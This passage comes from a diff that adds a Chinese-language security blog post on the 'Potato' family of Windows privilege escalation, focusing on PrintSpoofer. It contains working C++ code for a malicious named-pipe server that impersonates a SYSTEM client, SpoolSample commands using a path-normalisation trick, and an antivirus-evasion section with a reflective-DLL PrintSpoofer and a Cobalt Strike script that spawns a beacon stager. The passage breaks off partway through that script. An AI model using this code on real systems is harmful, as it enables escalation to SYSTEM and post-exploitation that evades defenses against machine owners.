+    &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[*] Named pipe &apos;%ls&apos; listening...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ConnectNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+    &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[+] A client connected!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ImpersonateNamedPipeClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;OpenThreadToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;代码运行演示如下，说说实现思路&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/seim.gif&quot; alt=&quot;seim&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里我们用Administrator账户（具有SeImpersonatePrivilege特权）的shell终端运行自己编写的”恶意“命名管道服务端，让具有System权限的命名管道客户端向我们创建的服务端写入数据，成功运用命名管道客户端模拟以达到Token令牌窃取的效果。关键代码：&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ImpersonateNamedPipeClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;OpenThreadToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;大致可以理解为，ImpersonateNamedPipeClient(hPipe); 运行后，当前进程的Token令牌被替换为命名管道客户端的Token令牌，客户端又具有System权限，所有当前进程模拟后也具有了System权限，接着再调用OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;amp;hToken);获取当前进程的Token令牌的句柄，并把Token令牌的句柄传给我们自己写的函数ImpersonatedUser(hToken)，达到Token令牌滥用的目的。&lt;/p&gt;
+
+&lt;p&gt;现在目光回到Potatoes家族，命名管道在当代土豆中扮演了怎样的角色，可以说了解了命名管道客户端模拟就是了解了当代土豆的一半，剩下一半是什么？&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;就是如何让具有System权限的管道客户端进程访问我们创建的恶意命名管道服务端&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;这里以经典的PrintSpoofer土豆为例，它大致可以分成两个部分：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;让具有SeImpersonatePrivilege特权的账户创建恶意命名管道服务端&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/leechristensen/SpoolSample&quot;&gt;SpoolSample&lt;/a&gt;&lt;/strong&gt; 结合Server Names路径规范解析特点，欺骗Spoolsv.exe进程（具有System权限）访问服务端，ImpersonateNamedPipeClient()替换线程令牌获得System权限&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;printspoofer-原理探究&quot;&gt;PrintSpoofer 原理探究&lt;/h1&gt;
+
+&lt;p&gt;PrintSpoofer的实现借鉴了&lt;a href=&quot;https://github.com/leechristensen/SpoolSample&quot;&gt;leechristensen/SpoolSample&lt;/a&gt;和一个Server Names路径解析的技巧。&lt;/p&gt;
+
+&lt;p&gt;SpoolSample又被叫做打印机欺骗，自然离不开Windows的Spoolsc.exe打印机后台服务进程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230720170152601.png&quot; alt=&quot;image-20230720170152601&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Spoolsv.exe&lt;/strong&gt;进程负责将用户提交的打印任务添加到打印队列中，并将其发送给相应的打印机进行处理。它还负责监控打印队列的状态，处理打印错误和通知用户打印任务的完成情况。Spoolsv.exe进程通常在Windows系统启动时自动运行，并在后台持续运行，确保打印机系统的正常工作。&lt;/p&gt;
+
+&lt;p&gt;并且它运行具有System权限&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230720171423961.png&quot; alt=&quot;image-20230720171423961&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SpoolSample作者的解释是，SpoolSample通常被用于强制 Windows 主机通过MS-RPRN（打印机协议） RPC 接口向其他计算机进行身份验证，初衷是运用于Windows域内进行利用。分析它的原理：&lt;/p&gt;
+
+&lt;p&gt;Windows的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS-RPRN&lt;/code&gt;协议用于打印客户端和打印服务器之间的通信，默认情况下打印服务是启用的。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230716233710224.png&quot; alt=&quot;image-20230716233710224&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SpoolSample的关键是Windows API中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRemoteFindFirstPrinterChangeNotificationEx()&lt;/code&gt;函数，它可以创建一个远程更改通知对象，该对象监视对打印机对象的更改，并使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRouterReplyPrinter&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRouterReplyPrinterEx&lt;/code&gt; 将更改通知发送到打印客户端。并且就是通过命名管道实现进程之间的通信。&lt;/p&gt;
+
+&lt;p&gt;其函数原型，&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
+   [in] PRINTER_HANDLE hPrinter,
+   [in] DWORD fdwFlags,
+   [in] DWORD fdwOptions,
+   [in, string, unique] wchar_t* pszLocalMachine,
+   [in] DWORD dwPrinterLocal,
+   [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
+ );
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;打印机后台程序处理服务的RPC接口本就通过命名管道公开，用pipelist查看，pipename管道名就是spoolss。本机的打印机管道路径&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;\\.\pipe\spools&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230720204255874.png&quot; alt=&quot;image-20230720204255874&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;到这我们可能理所应当的想到printspoofer的原理，利用SpoolSample强制Windows主机上的spoolss管道客户端向我们的恶意管道服务端发起连接，利用Windows API ImpersonateNamedPipeClient()模拟客户端的Access Token进行权限提升至System权限，这么说并不准确&lt;/p&gt;
+
+&lt;p&gt;我们不妨看看spoolsample的利用，下面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TARGET&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAPTURESERVER&lt;/code&gt;最后都会被填补成UNC路径&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SpoolSample.exe TARGET CAPTURESERVER
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;用Process Monitor记录进程读写，如下图，期间打印机Spoolsv.exe进程向管道 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\spools&lt;/code&gt; 尝试读写，但是结果是&lt;strong&gt;ACCESS_DENIED&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230720221609510.png&quot; alt=&quot;image-20230720221609510&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;肯定有朋友想到构造如下的的payload，其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\demo&lt;/code&gt; 是我们创建的恶意管道服务端&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\SpoolSample.exe 192.168.110.1 192.168.110.137\pipe\demo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;理想的预期是在进程读写里看见Spoolsv.exe进程向我们构造的恶意管道 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\demo&lt;/code&gt; 写入数据，然后直接模拟，进而提权&lt;/p&gt;
+
+&lt;p&gt;很可惜，尝试失败，spoolsv.exe进程对Server name做了校验，最后还是会替换成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\spools&lt;/code&gt; 管道。并且我们也无法创建和spools的同名恶意管道，因为它已经存在。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230720221937228.png&quot; alt=&quot;image-20230720221937228&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回看函数原型如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRINTER_HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hPrinter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdwFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdwOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pszLocalMachine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwPrinterLocal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RPC_V2_NOTIFY_OPTIONS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pOptions&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;关键在 &lt;strong&gt;pszLocalMachine：指向表示客户端计算机名称的字符串的指针。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;img/image-20230721013512436.png&quot; alt=&quot;image-20230721013512436&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;原因也是这里做了校验，会重置指定的命名管道&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721013524643.png&quot; alt=&quot;image-20230721013524643&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里PrintSpoofer的作者是用了个Server Names路径规范化解析的技巧&lt;/p&gt;
+
+&lt;p&gt;如果主机名包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;，它将通过路径检验，但是在计算要连接的命名管道的路径时，规范化会将其转换为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;，例如&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\SpoolSample.exe 192.168.110.1 192.168.110.137/test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721015758154.png&quot; alt=&quot;image-20230721015758154&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看见，连接的管道已经变成了&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137\test\pipe\spoolss
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;我们只需要根据命名管道的名称规范构造管道，举个例子&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137\pipe\demo\pipe\spoolss
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里分成两部分理解&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe&lt;/code&gt; 到这是正常命名&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\demo\pipe\spoolss&lt;/code&gt; 才是我们的管道名，因为打印机进程总会把\pipe\spoolss添加在路径后面&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;所以用上面的命名管道客户端模拟的代码，结合SpoolSample实现提权，演示一下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/seimw.gif&quot; alt=&quot;seimw&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137/pipe/demo
+通过命名检查后变成了
+\\192.168.110.137\pipe\demo
+最后在加上\pipe\spoolss，最终连接的命名管道就是
+\\192.168.110.137\pipe\demo\pipe\spoolss
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这也是我们需要创建的恶意命名管道服务端。PrintSpoofer的实现原理也就是这些，回看其源码&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721021921577.png&quot; alt=&quot;image-20230721021921577&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;观察其函数头文件中的函数声明，结构结合原理一目了然&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;VOID PrintUsage(); 功能提示（做免杀防特征最好直接删了）&lt;/li&gt;
+  &lt;li&gt;DWORD DoMain(); 主函数&lt;/li&gt;
+  &lt;li&gt;BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck); 检查是否有模拟特权&lt;/li&gt;
+  &lt;li&gt;BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName); 随机生成管道名，防止被杀软记录（这也是和BadPotato\pipePotato不同的地方）&lt;/li&gt;
+  &lt;li&gt;HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName); 创建恶意命名管道服务端&lt;/li&gt;
+  &lt;li&gt;HANDLE ConnectSpoolNamedPipe(HANDLE hPipe); 异步连接命名管道&lt;/li&gt;
+  &lt;li&gt;HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName); 触发打印机进程命名管道连接&lt;/li&gt;
+  &lt;li&gt;DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);  同上&lt;/li&gt;
+  &lt;li&gt;BOOL GetSystem(HANDLE hPipe); 模拟令牌等&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TriggerNamedPipeConnectionThread()&lt;/code&gt;这个函数中实现了SpoolSample的功能&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721022126500.png&quot; alt=&quot;image-20230721022126500&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;顺便看了看和PrintSpooler相同原理实现的，同一时期的&lt;a href=&quot;https://github.com/BeichenDream/BadPotato&quot;&gt;BadPotato&lt;/a&gt;，&lt;a href=&quot;https://github.com/daikerSec/pipePotato&quot;&gt;pipePotato&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;大概来说，BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低），其他的大差不差&lt;/p&gt;
+
+&lt;h1 id=&quot;免杀尝试&quot;&gt;免杀尝试&lt;/h1&gt;
+
+&lt;p&gt;拿BadPotato做个尝试&lt;/p&gt;
+
+&lt;p&gt;落地静态查杀的话，直接把所有Console输出语句替换就行，但是仅仅这样过不了动态&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Console\.WriteLine\((.*?); //直接正则替换完事了
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721215648985.png&quot; alt=&quot;image-20230721215648985&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721215834751.png&quot; alt=&quot;image-20230721215834751&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;下面就是看看动态了，用procmon看进程断在哪里，发现badPotato到创建cmd进程时360会提示提权风险，很明显不允许当前进程创建的新进程权限比当前的高，还是System权限的。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721221230199.png&quot; alt=&quot;image-20230721221230199&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230721222327163.png&quot; alt=&quot;image-20230721222327163&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后思路断了，功力不够。正好逛到Crisprx师傅的反射注入DLL结合CS免杀，用PrintSpooler实现的。学习下思路&lt;/p&gt;
+
+&lt;p&gt;使用的反射DLL注入项目的地址，&lt;a href=&quot;https://github.com/stephenfewer/ReflectiveDLLInjection&quot;&gt;stephenfewer/ReflectiveDLLInjection:&lt;/a&gt;，并且一般CS中编写反射注入DLL基本都是使用的该项目&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;导入相关的头文件：ReflectiveDllInjection.h、ReflectiveLoader.cpp、ReflectiveLoader.h&lt;/li&gt;
+  &lt;li&gt;将原来部分提权的操作放到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt;中，主要是放在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DLL_PROCESS_ATTACH&lt;/code&gt;中&lt;/li&gt;
+  &lt;li&gt;这里贴下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt;的代码：&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &quot;ReflectiveLoader.h&quot;
+#include &quot;PrintSpoofer.h&quot;
+#include &amp;lt;iostream&amp;gt;
+ 
+extern HINSTANCE hAppInstance;
+EXTERN_C IMAGE_DOS_HEADER __ImageBase;
+ 
+BOOL PrintSpoofer() {
+    BOOL bResult = TRUE;
+    LPWSTR pwszPipeName = NULL;
+    HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
+    HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
+    HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
+    DWORD dwWait = 0;
+ 
+    if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
+        wprintf(L&quot;[-] A privilege is missing: &apos;%ws&apos;\n&quot;, SE_IMPERSONATE_NAME);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    wprintf(L&quot;[+] Found privilege: %ws\n&quot;, SE_IMPERSONATE_NAME);
+ 
+    if (!GenerateRandomPipeName(&amp;amp;pwszPipeName)) {
+        wprintf(L&quot;[-] Failed to generate a name for the pipe.\n&quot;);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
+        wprintf(L&quot;[-] Failed to create a named pipe.\n&quot;);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
+        wprintf(L&quot;[-] Failed to connect the named pipe.\n&quot;);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    wprintf(L&quot;[+] Named pipe listening...\n&quot;);
+ 
+    if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
+        wprintf(L&quot;[-] Failed to trigger the Spooler service.\n&quot;);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
+    if (dwWait != WAIT_OBJECT_0) {
+        wprintf(L&quot;[-] Operation failed or timed out.\n&quot;);
+        bResult = FALSE;
+        goto cleanup;
+    }
+ 
+    if (!GetSystem(hSpoolPipe)) {
+        bResult = FALSE;
+        goto cleanup;
+    }
+    wprintf(L&quot;[+] Exploit successfully, enjoy your shell\n&quot;);
+ 
+cleanup:
+    if (hSpoolPipe)
+        CloseHandle(hSpoolPipe);
+    if (hSpoolPipeEvent)
+        CloseHandle(hSpoolPipeEvent);
+    if (hSpoolTriggerThread)
+        CloseHandle(hSpoolTriggerThread);
+ 
+    return bResult;
+}
+ 
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
+    BOOL bReturnValue = TRUE;
+    DWORD dwResult = 0;
+ 
+    switch (dwReason) {
+    case DLL_QUERY_HMODULE:
+        if (lpReserved != NULL)
+            *(HMODULE*)lpReserved = hAppInstance;
+        break;
+    case DLL_PROCESS_ATTACH:
+        hAppInstance = hinstDLL;
+        if (PrintSpoofer()) {
+            fflush(stdout);
+ 
+            if (lpReserved != NULL)
+                ((VOID(*)())lpReserved)();
+        } else {
+            fflush(stdout);
+        }
+ 
+        ExitProcess(0);
+        break;
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return bReturnValue;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;cna编写&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sub printspoofer {
+    btask($1, &quot;Task Beacon to run &quot; . listener_describe($2) . &quot; via PrintSpoofer&quot;);
+ 
+    if (-is64 $1)
+    {
+        $arch = &quot;x64&quot;;
+        $dll = script_resource(&quot;PrintSpoofer.x64.dll&quot;);
+    } else {
+        $arch = &quot;x86&quot;;
+        $dll = script_resource(&quot;PrintSpoofer.x86.dll&quot;);
+    }
+    $stager = shellcode($2, false, $arch);
+ 
+    bdllspawn!($1, $dll, $stager, &quot;PrintSpoofer local elevate privilege&quot;, 5000);
+ 
